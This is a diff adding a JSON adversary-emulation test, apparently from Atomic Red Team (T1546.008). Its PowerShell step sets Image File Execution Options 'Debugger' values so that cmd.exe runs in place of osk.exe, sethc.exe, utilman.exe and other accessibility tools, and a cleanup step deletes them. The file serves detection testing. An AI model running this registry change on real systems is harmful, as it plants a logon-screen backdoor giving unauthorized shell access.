@@ -1,0 +1,58 @@
+{
+  "id": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9",
+  "name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
+  "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ea29c3f5-adc7-42bd-9199-58b88664e536",
+      "type": "execute-command",
+      "data": {
+        "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "56176f25-5d6c-4707-8b7e-8c05c94ea1a3",
+      "type": "execute-command",
+      "data": {
+        "command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2\u003e\u00261 | Out-Null\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ea29c3f5-adc7-42bd-9199-58b88664e536",
+      "p": "on-success",
+      "o": "56176f25-5d6c-4707-8b7e-8c05c94ea1a3"
+    },
+    {
+      "s": "ea29c3f5-adc7-42bd-9199-58b88664e536",
+      "p": "on-failure",
+      "o": "56176f25-5d6c-4707-8b7e-8c05c94ea1a3"
+    }
+  ],
+  "tags": [
+    "T1546.008",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "parent_list",
+      "type": "string",
+      "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n",
+      "value": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
+    },
+    {
+      "name": "attached_process",
+      "type": "path",
+      "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n",
+      "value": "C:\\windows\\system32\\cmd.exe"
+    }
+  ]
+}
